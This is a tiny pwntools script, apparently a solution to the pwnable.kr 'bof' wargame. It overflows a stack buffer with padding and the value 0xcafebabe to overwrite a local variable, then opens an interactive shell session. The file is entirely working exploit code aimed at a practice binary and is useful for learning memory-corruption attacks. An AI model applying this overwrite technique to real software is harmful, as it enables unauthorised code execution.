from pwn import *

p = process('./bof')
# p = remote('pwnable.kr', 9000)

deadbeef_addr = 0xffffd030
overflowme_buf_addr = 0xffffcffc

p.send('A' * (deadbeef_addr-overflowme_buf_addr) + p32(0xcafebabe))

p.interactive()